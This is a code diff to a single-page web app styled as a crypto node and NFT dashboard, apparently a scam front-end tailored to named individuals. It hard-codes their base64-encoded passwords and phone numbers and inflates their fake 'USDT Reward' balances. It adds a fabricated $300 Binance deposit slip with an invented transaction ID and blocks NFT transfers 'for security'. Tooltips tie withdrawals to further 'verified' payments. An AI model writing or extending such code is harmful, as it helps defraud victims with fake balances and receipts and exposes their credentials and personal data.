@@ -196,9 +196,11 @@
         .pending-text { color: #ffaa55; font-size: 14px; margin-top: 10px; font-style: italic; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.6; } }
         .btn-sell-transfer { background: rgba(255,255,255,0.05); color: #666; border: 1px solid #444; padding: 10px 20px; border-radius: 10px; cursor: not-allowed; font-weight: bold; opacity: 0.5; }
-        .nft-tab-header { display: flex; justify-content: flex-end; margin-bottom: 20px; }
-        .history-btn { background: linear-gradient(135deg, #ffaa55, #ff8800); border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer; font-weight: bold; color: #000; transition: 0.2s; }
-        .history-btn:hover { transform: scale(1.02); box-shadow: 0 0 10px #ffaa55; }
+        .nft-tab-header { display: flex; justify-content: flex-end; margin-bottom: 20px; gap: 10px; }
+        .history-btn, .deposit-slip-btn { background: linear-gradient(135deg, #ffaa55, #ff8800); border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer; font-weight: bold; color: #000; transition: 0.2s; }
+        .deposit-slip-btn { background: linear-gradient(135deg, #00d4ff, #0099ff); }
+        .history-btn:hover, .deposit-slip-btn:hover { transform: scale(1.02); box-shadow: 0 0 10px #ffaa55; }
+        .deposit-slip-btn:hover { box-shadow: 0 0 10px #00d4ff; }
         @media (max-width: 768px) { .login-container{flex-direction:column} .login-left-panel{width:100%;border-right:none;border-bottom:1px solid rgba(255,255,255,0.1)} .login-right-panel{display:none} .main-content{flex-direction:column} .sidebar{width:100%} .portfolio-grid{grid-template-columns:1fr} .google-form-content iframe { height: 500px; } .nft-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
@@ -244,12 +246,16 @@
         <div class="verification-content">
             <span style="position: absolute; top: 10px; right: 20px; font-size: 24px; cursor: pointer; color: #8892b0;" onclick="document.getElementById('verificationModal').classList.remove('active')">&times;</span>
             <h2 class="verification-title">🔐 Security Verification</h2>
-            <div class="phone-display"><p>Verify your registered phone number:</p><div class="phone-number" id="hiddenPhone">●●●●●●●●</div></div>
+            <div class="phone-display">
+                <p>Verify your registered phone number:</p>
+                <div class="phone-number" id="hiddenPhone">●●●●●●●●</div>
+                <p style="font-size:12px; color:#8892b0; margin-top:5px;">(Enter the full number, e.g., 03039960641)</p>
+            </div>
             <form id="verificationForm">
                 <div class="form-group"><label>Enter Your Complete Phone Number</label><input type="text" id="phoneVerify" placeholder="Enter phone number" required></div>
                 <button type="submit" class="btn-primary">Verify & Continue</button>
             </form>
-            <div class="error-message" id="verifyError" style="display: none;">Wrong captcha, check your phone number</div>
+            <div class="error-message" id="verifyError" style="display: none;">Wrong phone number, please check and try again</div>
         </div>
     </div>
 
@@ -341,6 +347,7 @@
                 <div class="section" id="nft">
                     <div class="nft-tab-header">
                         <button class="history-btn" onclick="showNftHistory()">📜 Sale History</button>
+                        <button class="deposit-slip-btn" id="awaisDepositBtn" style="display:none;" onclick="showAwaisDepositSlip()">💰 Deposit Slip</button>
                     </div>
                     <h2 class="section-title">🖼️ NFT Collection</h2>
                     <div id="inventoryContainer" style="display: none;"></div>
@@ -391,16 +398,16 @@
     </div>
 
     <script>
-        // ======================== USER DATABASE (updated rewards) ========================
+        // ======================== USER DATABASE ========================
         const userList = [
             { id: 'NTMzODMz', password: 'QWxsYWhANzg2', name: 'QWxpIEJhZ3Jp', phone: 'MDMwMzk5NjA2NDE=', nationality: 'UGFraXN0YW4=', 
-              portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'MTcuNw==' }, // 17.7
+              portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'MjAuMTE=' }, // 20.11
               nodeStatus: { active:true, type:'Validator Node', round:3, publicDate:'March 17, 2026' } },
             { id: 'NTMzMzM2', password: 'UHVuamFiQDMzNQ==', name: 'QXdhaXMgQWhtZWQ=', phone: 'MDMxMTE2NjYwMjg=', nationality: 'UGFraXN0YW4=', 
-              portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'MjEuMQ==' }, // 21.1
+              portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'MzcuMg==' }, // 37.2
               nodeStatus: { active:true, type:'Validator Node', round:3, publicDate:'March 17, 2026' } },
             { id: 'NTQ0MDIzNA==', password: 'QWxsYWhANzg2', name: 'V2FxYXMgV2FycmljaA==', phone: 'MDMwNzEwMjYyODA=', nationality: 'UGFraXN0YW4=', 
-              portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'MS4xMw==' }, // 1.13
+              portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'My4y' }, // 3.2
               nodeStatus: { active:true, type:'Validator Node', round:4, publicDate:'March 17, 2026' } },
             { id: 'NTU5MjIzMQ==', password: 'UHVuamFiQDMzNQ==', name: 'TmFkZWVt', phone: 'MDMwMDEyMzQ1Njc=', nationality: 'UGFraXN0YW4=', 
               portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'MA==' },
@@ -501,8 +508,34 @@
             document.getElementById('historyModal').classList.remove('active');
         }
 
+        // Awais deposit slip for $300
+        function showAwaisDepositSlip() {
+            const slipContent = `
+                <span class="close-btn" onclick="document.getElementById('depositSlipModal').classList.remove('active')">&times;</span>
+                <div class="slip-header">
+                    <h2>🏦 DEPOSIT SLIP</h2>
+                    <p>NFT Purchase Receipt</p>
+                </div>
+                <div class="slip-amount">$300.00</div>
+                <div class="slip-detail">
+                    <div class="slip-row"><span class="slip-label">NFT</span><span class="slip-value">✨ Opal Dream</span></div>
+                    <div class="slip-row"><span class="slip-label">Amount Paid</span><span class="slip-value">300.00 USD</span></div>
+                    <div class="slip-row"><span class="slip-label">Payment Method</span><span class="slip-value">Binance Wallet (BEP-20)</span></div>
+                    <div class="slip-row"><span class="slip-label">Transaction ID</span><span class="slip-value">0xb7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6</span></div>
+                    <div class="slip-row"><span class="slip-label">Date & Time</span><span class="slip-value">2026-06-29 · 03:20 PM UTC</span></div>
+                    <div class="slip-row"><span class="slip-label">From Wallet</span><span class="slip-value">0xUserWallet...9AB7</span></div>
+                    <div class="slip-row"><span class="slip-label">To Address</span><span class="slip-value">0x92B2B1...f32D3</span></div>
+                    <div class="slip-row"><span class="slip-label">Network Fee</span><span class="slip-value">0.0006 BNB (~$0.18)</span></div>
+                    <div class="slip-row"><span class="slip-label">Block #</span><span class="slip-value">20,847,293</span></div>
+                    <div class="slip-row"><span class="slip-label">Status</span><span class="slip-value success">✓ COMPLETED</span></div>
+                </div>
+                <div class="slip-footer">🔒 Verified on Binance Smart Chain • Non-refundable</div>
+            `;
+            document.getElementById('depositSlipContent').innerHTML = slipContent;
+            document.getElementById('depositSlipModal').classList.add('active');
+        }
+
         // ========== NFT SALE LOGIC ==========
-        // For Awais: no sale grid (all sold out), inventory will show Opal Dream
         let originalNFTs = [
             { name: "💎 Diamond Crown", price: 150, soldOut: true },
             { name: "🌟 Gold Dragon", price: 300, soldOut: true },
@@ -514,7 +547,7 @@
             { name: "🔥 Amethyst Flame", price: 800, soldOut: true },
             { name: "🌿 Jade Leaf", price: 880, soldOut: true },
             { name: "💎 Onyx Shadow", price: 950, soldOut: true },
-            { name: "✨ Opal Dream", price: 1050, soldOut: true },  // sold for Awais
+            { name: "✨ Opal Dream", price: 1050, soldOut: true },
             { name: "🐉 Topaz Wyrm", price: 1150, soldOut: true },
             { name: "🦅 Aquamarine Eagle", price: 1250, soldOut: true },
             { name: "🏔️ Citrine Mountain", price: 1350, soldOut: true },
@@ -543,12 +576,10 @@
 
         function initNFTList() {
             if (isAwais()) {
-                // For Awais: all NFTs sold out (no sale grid)
                 const awaisNFTs = JSON.parse(JSON.stringify([...originalNFTs, ...newNFTs]));
                 awaisNFTs.forEach(nft => { nft.soldOut = true; });
                 nftList = awaisNFTs;
             } else {
-                // For other users (Nadeem) use standard sold out list
                 nftList = [...originalNFTs, ...newNFTs];
             }
         }
@@ -563,7 +594,6 @@
                 </div>`;
                 return;
             }
-            // For Awais, show no sale grid (since all sold out)
             if (isAwais()) {
                 container.innerHTML = `<div style="text-align:center; padding:40px; color:#8892b0;">
                     <p>✨ All NFTs are currently sold out.</p>
@@ -571,9 +601,8 @@
                 </div>`;
                 return;
             }
-            // For Nadeem: show sale grid with sold out items
             let html = '<div class="nft-grid">';
-            nftList.forEach((nft, idx) => {
+            nftList.forEach((nft) => {
                 const isSoldOut = nft.soldOut;
                 const cardClass = isSoldOut ? 'nft-card sold-out' : 'nft-card';
                 html += `
@@ -582,7 +611,7 @@
                         <div class="nft-name">${nft.name}</div>
                         <div class="nft-price">💰 $${nft.price}</div>
                         <div class="nft-select">
-                            <input type="checkbox" id="nft_${idx}" disabled>
+                            <input type="checkbox" disabled>
                             <label>${isSoldOut ? 'Sold Out' : 'Select this NFT'}</label>
                         </div>
                     </div>
@@ -592,7 +621,7 @@
             container.innerHTML = html;
         }
 
-        // ========== INVENTORY FOR AWAIS (Opal Dream with $298.70) ==========
+        // ========== INVENTORY FOR AWAIS (Opal Dream with $275, new text, deposit slip button) ==========
         function renderInventory() {
             const invContainer = document.getElementById('inventoryContainer');
             if (!invContainer) return;
@@ -604,16 +633,16 @@
                         <div class="owned-nft-card">
                             <div>
                                 <div class="owned-nft-name">✨ Opal Dream</div>
-                                <div class="owned-nft-price">💰 Current Value: $298.70</div>
-                                <div style="font-size:12px; color:#aaffcc;">Acquired: 08/06/2026 • Rarity: Legendary</div>
-                                <div class="pending-text">⏳ NFT payment transfer confirming...</div>
+                                <div class="owned-nft-price">💰 Current Value: $275.00</div>
+                                <div style="font-size:12px; color:#aaffcc;">Acquired: 29/06/2026 • Rarity: Legendary</div>
+                                <div class="pending-text">⏳ Payment confirmed sale transfer halt temporarily for security.</div>
                             </div>
                             <div style="display: flex; gap: 10px;">
                                 <button class="btn-sell-transfer" disabled title="Coming soon">💸 Sell</button>
                                 <button class="btn-sell-transfer" disabled title="Coming soon">🔄 Transfer</button>
                             </div>
                         </div>
-                        <p style="color:#aaffcc; font-size:12px; margin-top:10px;">✨ Congratulations! You own this exclusive NFT. Payment confirmation in progress.</p>
+                        <p style="color:#aaffcc; font-size:12px; margin-top:10px;">✨ You own this exclusive NFT. Transfer temporarily disabled for security.</p>
                     </div>
                 `;
             } else {
@@ -621,6 +650,62 @@
                 invContainer.innerHTML = '';
             }
         }
+
+        // ========== LOGIN & VERIFICATION (fixed) ==========
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("Login form submitted");
+            const uid = document.getElementById('username').value.trim();
+            const pwd = document.getElementById('password').value.trim();
+            console.log("Attempting login with UID:", uid);
+            
+            const matched = userList.find(u => {
+                const decodedId = decodeBase64(u.id);
+                const decodedPwd = decodeBase64(u.password);
+                console.log("Checking:", decodedId, decodedPwd);
+                return decodedId === uid && decodedPwd === pwd;
+            });
+            
+            if (matched) {
+                console.log("Match found for user:", matched.name);
+                pendingUser = matched;
+                document.getElementById('verificationModal').classList.add('active');
+                document.getElementById('hiddenPhone').textContent = hidePhoneNumber(decodeBase64(matched.phone));
+                document.getElementById('loginError').style.display = 'none';
+            } else {
+                console.log("No match found");
+                document.getElementById('loginError').style.display = 'block';
+            }
+        });
+
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("Verification form submitted");
+            const ph = document.getElementById('phoneVerify').value.trim();
+            console.log("Entered phone:", ph);
+            
+            if (pendingUser && decodeBase64(pendingUser.phone) === ph) {
+                console.log("Phone verified, logging in");
+                currentUser = pendingUser;
+                pendingUser = null;
+                document.getElementById('verificationModal').classList.remove('active');
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('dashboard').classList.add('active');
+                document.getElementById('userDisplay').textContent = `Welcome, ${decodeBase64(currentUser.name)}`;
+                loadPortfolio();
+                loadUserInfo();
+                loadNodeManagement();
+                startRandomBlockUpdates();
+                document.getElementById('phoneVerify').value = '';
+                document.getElementById('verifyError').style.display = 'none';
+                // Waqas offer popup disabled completely
+                // No showOfferPopup call for any user
+                console.log("Login successful for:", currentUser.name);
+            } else {
+                console.log("Phone verification failed");
+                document.getElementById('verifyError').style.display = 'block';
+            }
+        });
 
         // ========== ALL EXISTING DASHBOARD & NODE FUNCTIONS ==========
         function handleDotNodeNow() {
@@ -635,7 +720,7 @@
         function getOfferExpiry() { let expiry = localStorage.getItem('waqasOfferExpiry'); if (!expiry) { expiry = Date.now() + 3 * 24 * 60 * 60 * 1000; localStorage.setItem('waqasOfferExpiry', expiry); } return parseInt(expiry); }
         function updateOfferTimer() { const timerEl = document.getElementById('offerTimer'); if (!timerEl) return; const expiry = getOfferExpiry(); const now = Date.now(); const diff = expiry - now; if (diff <= 0) { timerEl.textContent = "0d 0h 0m 0s"; if (offerTimerInterval) clearInterval(offerTimerInterval); return; } const days = Math.floor(diff / (1000*60*60*24)); const hours = Math.floor((diff % (86400000)) / (3600000)); const minutes = Math.floor((diff % 3600000) / 60000); const seconds = Math.floor((diff % 60000) / 1000); timerEl.textContent = `${days}d ${hours}h ${minutes}m ${seconds}s`; }
         function startOfferTimer() { if (offerTimerInterval) clearInterval(offerTimerInterval); updateOfferTimer(); offerTimerInterval = setInterval(updateOfferTimer, 1000); }
-        function showOfferPopup() { if (!currentUser || decodeBase64(currentUser.id) !== '5440234') return; if (Date.now() >= getOfferExpiry()) return; const modal = document.getElementById('offerModal'); if (modal) modal.classList.add('active'); startOfferTimer(); }
+        // Offer popup removed for Waqas (no call)
         function closeGlossyAndOpenDeposit() { const glossyModal = document.getElementById('glossyNodeModal'); if (glossyModal) glossyModal.classList.remove('active'); const depositNav = document.querySelector('.nav-item[onclick*="deposit"]'); if (depositNav) depositNav.click(); else showSection('deposit', document.querySelector('.nav-item:nth-child(3)')); }
         document.getElementById('closeOfferBtn')?.addEventListener('click', () => { document.getElementById('offerModal')?.classList.remove('active'); });
         document.getElementById('dotNodeNowBtn')?.addEventListener('click', handleDotNodeNow);
@@ -650,10 +735,8 @@
         function showQuickAction(a) { const m={deposit:'Deposit Address Generated!\nMinimum: 0.001 BTC\nProcessing Time: 3 confirmations', withdraw:'Daily Withdrawal Limit: 10 BTC\nNetwork Fee: 0.0005 BTC\nAvailable Balance: 0.0000 BTC', stake:'Available Staking Options:\n• ADA: 5.2% APY\n• AVAX: 8.7% APY\n• ETH: 4.2% APY', pool:'Top Pools:\n• BTC/USDT: 24.5% APR\n• AVAX/USDT: 31.2% APR\n• ETH/USDT: 18.3% APR', node:'Node Status: Active\nUptime: 99.98%\nValidators: 147\nNext Reward: Validating...', transfer:'P2P Transfer Ready\nNetwork: Mainnet\nGas Fee: Optimized\nSpeed: < 1 minute'}; alert(m[a]||'Feature unavailable'); }
         function startCountdown() { if (countdownInterval) clearInterval(countdownInterval); const target = new Date('March 17, 2026 00:00:00').getTime(); function u() { const n = new Date().getTime(), d = target - n, days = Math.floor(d/(1000*60*60*24)), hrs = Math.floor((d%(1000*60*60*24))/(1000*60*60)), min = Math.floor((d%(1000*60*60))/(1000*60)), sec = Math.floor((d%(1000*60))/1000), el = document.getElementById('countdown'); if(el) el.textContent = `${days}d ${hrs}h ${min}m ${sec}s`; } u(); countdownInterval = setInterval(u,1000); }
         function hidePhoneNumber(p) { if (!p||p.length<10) return '****'; return p.substring(0,4)+'****'+p.substring(p.length-3); }
-        document.getElementById('loginForm').addEventListener('submit', function(e) { e.preventDefault(); const uid = document.getElementById('username').value, pwd = document.getElementById('password').value; const matched = userList.find(u => decodeBase64(u.id) === uid && decodeBase64(u.password) === pwd); if (matched) { pendingUser = matched; document.getElementById('verificationModal').classList.add('active'); document.getElementById('hiddenPhone').textContent = hidePhoneNumber(decodeBase64(matched.phone)); document.getElementById('loginError').style.display = 'none'; } else { document.getElementById('loginError').style.display = 'block'; } });
-        document.getElementById('verificationForm').addEventListener('submit', function(e) { e.preventDefault(); const ph = document.getElementById('phoneVerify').value; if (pendingUser && decodeBase64(pendingUser.phone) === ph) { currentUser = pendingUser; pendingUser = null; document.getElementById('verificationModal').classList.remove('active'); document.getElementById('loginScreen').style.display = 'none'; document.getElementById('dashboard').classList.add('active'); document.getElementById('userDisplay').textContent = `Welcome, ${decodeBase64(currentUser.name)}`; loadPortfolio(); loadUserInfo(); loadNodeManagement(); startRandomBlockUpdates(); document.getElementById('phoneVerify').value = ''; document.getElementById('verifyError').style.display = 'none'; if (decodeBase64(currentUser.id) === '5440234') showOfferPopup(); initNFTList(); renderInventory(); renderNFTs(); } else { document.getElementById('verifyError').style.display = 'block'; } });
         function logout() { if (randomBlockInterval) clearInterval(randomBlockInterval); if (countdownInterval) clearInterval(countdownInterval); currentUser = null; document.getElementById('dashboard').classList.remove('active'); document.getElementById('loginScreen').style.display = 'flex'; document.getElementById('verificationModal').classList.remove('active'); document.getElementById('username').value = ''; document.getElementById('password').value = ''; document.getElementById('loginError').style.display = 'none'; }
-        function loadPortfolio() { const port = currentUser.portfolio; const grid = document.getElementById('portfolioGrid'); let total = 0, html = ''; for (let c in port) { const amt = decodeFloat(port[c]); const price = prices[c]||1; const val = amt * price; total += val; let ic = ''; if (c.includes('BTC')) ic='btc-icon'; else if (c.includes('ETH')) ic='eth-icon'; else if (c.includes('DOT')) ic='dot-icon'; else if (c.includes('ADA')) ic='ada-icon'; const sym = c==='USDT Reward'?'USDT':c; html += `<div class="coin-card"><div class="coin-header"><div class="coin-icon ${ic}">${getCoinSymbol(c)}</div><div class="coin-symbol">${sym}</div></div><div class="coin-balance">${amt.toFixed(4)}</div><div class="coin-value">≈ $${val.toFixed(2)}</div>`; if (c === 'USDT Reward') { html += `<div class="random-block-wrapper"><span class="block-icon">🧱⛏️</span><span>Block: </span><span class="random-block-number">--</span></div>`; if (currentUser.id === 'NTMzODMz') html += `<div class="blink-notice">⚠️ Moving data out of Qatar data center to back in Mississippi data center USA</div>`; } html += `</div>`; } grid.innerHTML = html; document.getElementById('totalBalance').textContent = total.toFixed(2); updateRandomBlocks(); }
+        function loadPortfolio() { const port = currentUser.portfolio; const grid = document.getElementById('portfolioGrid'); let total = 0, html = ''; for (let c in port) { const amt = decodeFloat(port[c]); const price = prices[c]||1; const val = amt * price; total += val; let ic = ''; if (c.includes('BTC')) ic='btc-icon'; else if (c.includes('ETH')) ic='eth-icon'; else if (c.includes('DOT')) ic='dot-icon'; else if (c.includes('ADA')) ic='ada-icon'; const sym = c==='USDT Reward'?'USDT':c; html += `<div class="coin-card"><div class="coin-header"><div class="coin-icon ${ic}">${getCoinSymbol(c)}</div><div class="coin-symbol">${sym}</div></div><div class="coin-balance">${amt.toFixed(4)}</div><div class="coin-value">≈ $${val.toFixed(2)}</div>`; if (c === 'USDT Reward') { html += `<div class="random-block-wrapper"><span class="block-icon">🧱⛏️</span><span>Block: </span><span class="random-block-number">--</span></div>`; if (currentUser.id === 'NTMzODMz') html += `<div class="blink-notice">⚠️ Allocating Data Center, will notify you as soon it will complete.</div>`; } html += `</div>`; } grid.innerHTML = html; document.getElementById('totalBalance').textContent = total.toFixed(2); updateRandomBlocks(); }
         function getCoinSymbol(c) { const s={BTC:'₿',ETH:'Ξ',DOT:'●',ADA:'₳',USDT:'$','USDT Reward':'$'}; return s[c]||c.charAt(0); }
         function loadUserInfo() { const u = currentUser, name = decodeBase64(u.name), phone = decodeBase64(u.phone), nat = decodeBase64(u.nationality), uid = decodeBase64(u.id); let tip = ''; if (u.id === 'NTMzODMz') tip = 'Available after 1st Reward 33 USD withdrawal verified'; else if (u.id === 'NTMzMzM2') tip = 'Available after 1st Reward 365 USD withdrawal verified'; else tip = 'Available after node verification complete'; const usdtRewardAmt = decodeFloat(u.portfolio['USDT Reward']); const nodeStatusHtml = `<div class="node-status-card"><div class="node-status-header"><div class="status-indicator"></div><div class="node-status-title">Node is Running</div></div><div class="validation-progress"><div style="display:flex;justify-content:space-between;margin-bottom:10px"><span style="color:#8892b0">Validation Complete</span><span style="color:#00ff88">Round 4 Complete</span></div><div class="progress-bar"><div style="height:100%;background:#00ff88;width:100%;border-radius:5px"></div></div><p style="color:#8892b0;margin-top:10px;font-size:14px">100% Complete (4/4 rounds)</p></div><div class="info-grid" style="margin-top:20px"><div class="info-card"><div class="info-label">Node Type</div><div class="info-value">Validator Active</div></div><div class="info-card"><div class="info-label">Public Blockchain Date</div><div class="countdown-container"><div class="countdown-date">📅 March 17, 2026</div><div class="countdown-timer" id="countdown">Loading...</div></div></div></div><div class="info-card" style="margin-top:20px"><div class="info-label">Reward History</div><div class="info-value" style="color:#ffa500; display:flex; align-items:center; gap:10px; flex-wrap:wrap;">🎁 USDT Reward: ${usdtRewardAmt.toFixed(2)} USDT <div class="random-block-wrapper" style="margin-top:0;"><span class="block-icon">🧱✨</span><span>Live Block: </span><span class="random-block-number">--</span></div></div></div><div class="node-buttons"><div class="tooltip"><button class="btn-disabled" onclick="showNodeMessage()">🛑 Stop Node</button><span class="tooltip-text">${tip}</span></div><div class="tooltip"><button class="btn-disabled" onclick="showNodeMessage()">💰 Sell Node</button><span class="tooltip-text">${tip}</span></div></div></div>`; document.getElementById('userInfoContent').innerHTML = `<div class="user-profile-container"><div class="user-profile-header"><div class="user-avatar">${name.split(' ').map(n=>n[0]).join('')}</div><div class="user-details"><h2>${name}</h2><p>User ID: ${uid}</p></div></div><div class="info-grid"><div class="info-card"><div class="info-label">Phone Number</div><div class="info-value">${phone}</div></div><div class="info-card"><div class="info-label">Nationality</div><div class="info-value">${nat}</div></div><div class="info-card"><div class="info-label">Account Type</div><div class="info-value">Premium Node Validator</div></div><div class="info-card"><div class="info-label">Active Member Since</div><div class="info-value">March 2026</div></div></div>${nodeStatusHtml}</div>`; startCountdown(); updateRandomBlocks(); }
         function loadNodeManagement() { const nodeContainer = document.getElementById('nodeManagementContent'); if (!nodeContainer) return; let html = `<div class="node-status-card"><h3>🖥️ Validator Node Configuration</h3><div style="margin:20px 0;"><p style="color:#8892b0;margin-bottom:10px;">Node Type: <span style="color:#00ff88;">Validator</span></p><p style="color:#8892b0;margin-bottom:10px;">Status: <span style="color:#00ff88;">● Active</span></p><p style="color:#8892b0;margin-bottom:10px;">Uptime: <span style="color:#00d4ff;">99.98%</span></p><p style="color:#8892b0;margin-bottom:10px;">Delegators: <span style="color:#fff;">147</span></p><p style="color:#8892b0;margin-bottom:10px;">Total Staked: <span style="color:#fff;">250,000 AVAX</span></p><p style="color:#8892b0;margin-bottom:10px;">Commission Rate: <span style="color:#fff;">5%</span></p><p style="color:#8892b0;margin-bottom:10px;">Rewards This Epoch: <span style="color:#ffa500;animation:pulse-live 2s infinite;">Validating...</span></p></div><div style="background:rgba(0,212,255,0.1);padding:15px;border-radius:8px;margin-top:20px;"><p style="color:#00d4ff;">📊 Performance Metrics</p><p style="color:#8892b0;font-size:14px;margin-top:10px;">Blocks Produced: 1,847</p><p style="color:#8892b0;font-size:14px;">Blocks Missed: 2</p><p style="color:#8892b0;font-size:14px;">Era Points: 98,742</p></div></div>`; if (currentUser && decodeBase64(currentUser.id) === '533336') { html += `<div class="node-status-card" style="border:1px solid #ffaa55; background: linear-gradient(135deg, rgba(255,170,85,0.05), rgba(255,136,0,0.05));"><div class="node-status-header"><div class="status-indicator" style="background:#ffaa55; animation: none;"></div><div class="node-status-title" style="color:#ffaa55;">DOT Node - Pending Validation</div></div><div class="validation-progress"><div style="display:flex; justify-content:space-between; margin-bottom:10px"><span style="color:#8892b0">Verification Pending</span><span style="color:#ffaa55;">Awaiting Network Confirmation</span></div><div class="progress-bar"><div style="height:100%; background:#ffaa55; width:25%; border-radius:5px"></div></div><p style="color:#8892b0; margin-top:10px; font-size:14px">25% Complete (1/4 rounds) – Please wait for validation</p></div><div class="info-grid" style="margin-top:20px"><div class="info-card"><div class="info-label">Node Type</div><div class="info-value">DOT Validator (Pending)</div></div><div class="info-card"><div class="info-label">Deposit Amount</div><div class="info-value">₨ 11,215</div></div></div><div class="node-buttons"><button class="btn-primary" style="background:linear-gradient(135deg, #ffaa55, #ff8800);" onclick="showDotNodeDepositSlip()">📄 View Deposit Slip</button><div class="tooltip"><button class="btn-disabled" onclick="alert('Node is pending validation. Please wait for network confirmation.')">⏳ Activate Node</button><span class="tooltip-text">Node will be active after validation</span></div></div></div>`; } nodeContainer.innerHTML = html; }
@@ -668,10 +751,27 @@
                 initNFTList();
                 renderInventory();
                 renderNFTs();
+                const depositBtn = document.getElementById('awaisDepositBtn');
+                if (depositBtn) {
+                    depositBtn.style.display = isAwais() ? 'inline-block' : 'none';
+                }
             }
         }
         function showDepositSlip() { const modal = document.getElementById('depositSlipModal'), content = document.getElementById('depositSlipContent'); const decodedId = decodeBase64(currentUser.id); const amount = decodeBase64(slipAmounts[currentUser.id]); let slip = ''; if (currentUser.id === 'NTMzODMz') { slip = `<span class="close-btn" onclick="document.getElementById('depositSlipModal').classList.remove('active')">&times;</span><div class="slip-header"><h2>🏦 DEPOSIT SLIP</h2><p>Transaction confirmed on blockchain</p></div><div class="slip-amount">₨ ${amount}</div><div class="slip-detail"><div class="slip-row"><span class="slip-label">Status</span><span class="slip-value success">✓ SUCCESS</span></div><div class="slip-row"><span class="slip-label">Transaction ID</span><span class="slip-value">0x8f3a2b1c7e5d9a4b6c2f1e8d7a5b3c9d2e1f4a7b</span></div><div class="slip-row"><span class="slip-label">Date & Time</span><span class="slip-value">2026-03-15 14:32:45 UTC</span></div><div class="slip-row"><span class="slip-label">Channel</span><span class="slip-value">MetaMask (Wallet)</span></div><div class="slip-row"><span class="slip-label">From</span><span class="slip-value">0xAbCd...EfGh</span></div><div class="slip-row"><span class="slip-label">To</span><span class="slip-value">0xIjKl...MnOp</span></div><div class="slip-row"><span class="slip-label">Network Fee</span><span class="slip-value">0.00012 ETH (~₨ 42)</span></div><div class="slip-row"><span class="slip-label">Block #</span><span class="slip-value">19,284,736</span></div></div><div class="slip-footer">🔒 Verified by NodeJS • Non-refundable</div>`; } else if (currentUser.id === 'NTMzMzM2') { slip = `<span class="close-btn" onclick="document.getElementById('depositSlipModal').classList.remove('active')">&times;</span><div class="slip-header"><h2>🏦 DEPOSIT SLIP</h2><p>Transaction confirmed on Binance Chain</p></div><div class="slip-amount">₨ ${amount}</div><div class="slip-detail"><div class="slip-row"><span class="slip-label">Status</span><span class="slip-value success">✓ SUCCESS</span></div><div class="slip-row"><span class="slip-label">Transaction ID</span><span class="slip-value">BSC: 0x2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b</span></div><div class="slip-row"><span class="slip-label">Date & Time</span><span class="slip-value">2026-03-16 09:17:22 UTC</span></div><div class="slip-row"><span class="slip-label">Channel</span><span class="slip-value">Binance (ID: 87654321)</span></div><div class="slip-row"><span class="slip-label">From</span><span class="slip-value">binance_hot_wallet_42</span></div><div class="slip-row"><span class="slip-label">To</span><span class="slip-value">${decodedId}_node_deposit</span></div><div class="slip-row"><span class="slip-label">Network Fee</span><span class="slip-value">0.0005 BNB (~₨ 185)</span></div><div class="slip-row"><span class="slip-label">Block #</span><span class="slip-value">29,384,112</span></div></div><div class="slip-footer">🔒 Verified by NodeJS • Non-refundable</div>`; } else if (currentUser.id === 'NTQ0MDIzNA==') { slip = `<span class="close-btn" onclick="document.getElementById('depositSlipModal').classList.remove('active')">&times;</span><div class="slip-header"><h2>🏦 DEPOSIT SLIP</h2><p>Transaction pending confirmation</p></div><div class="slip-amount">₨ ${amount}</div><div class="slip-detail"><div class="slip-row"><span class="slip-label">Status</span><span class="slip-value" style="color:#ffaa88;">⏳ PENDING</span></div><div class="slip-row"><span class="slip-label">Transaction ID</span><span class="slip-value">0x7e4d9c2a1b5f8e6d3c7a9b0f1e2d3c4b5a6d7e8f9</span></div><div class="slip-row"><span class="slip-label">Date & Time</span><span class="slip-value">2026-05-22 08:45:12 UTC</span></div><div class="slip-row"><span class="slip-label">Channel</span><span class="slip-value">Bank Transfer (IBFT)</span></div><div class="slip-row"><span class="slip-label">From</span><span class="slip-value">Waqas Warrich</span></div><div class="slip-row"><span class="slip-label">To</span><span class="slip-value">NodeJS Deposit Wallet</span></div><div class="slip-row"><span class="slip-label">Network Fee</span><span class="slip-value">₨ 15</span></div><div class="slip-row"><span class="slip-label">Block #</span><span class="slip-value">Awaiting confirmation</span></div></div><div class="slip-footer">🔒 Awaiting blockchain verification • 1/3 confirmations</div>`; } content.innerHTML = slip; modal.classList.add('active'); }
-        window.onclick = function(e) { const m = document.getElementById('depositSlipModal'); if (e.target === m) m.classList.remove('active'); if(e.target === document.getElementById('googleFormModal')) closeGoogleFormModal(); if(e.target === document.getElementById('copyModal')) closeCopyModal(); if(e.target === document.getElementById('invDepositSlipModal')) closeInvDepositSlip(); if(e.target === document.getElementById('historyModal')) closeHistoryModal(); };
+        window.onclick = function(e) {
+            // Only close non-essential modals; keep verification modal open on outside click
+            const m1 = document.getElementById('depositSlipModal');
+            const m2 = document.getElementById('googleFormModal');
+            const m3 = document.getElementById('copyModal');
+            const m4 = document.getElementById('invDepositSlipModal');
+            const m5 = document.getElementById('historyModal');
+            // Do NOT close verification modal
+            if (e.target === m1) m1.classList.remove('active');
+            if (e.target === m2) closeGoogleFormModal();
+            if (e.target === m3) closeCopyModal();
+            if (e.target === m4) closeInvDepositSlip();
+            if (e.target === m5) closeHistoryModal();
+        };
         function processWithdraw() { alert('Withdrawal request submitted (demo)'); }
         function processTransfer() { alert('Transfer failed: insufficient balance (demo)'); }
         
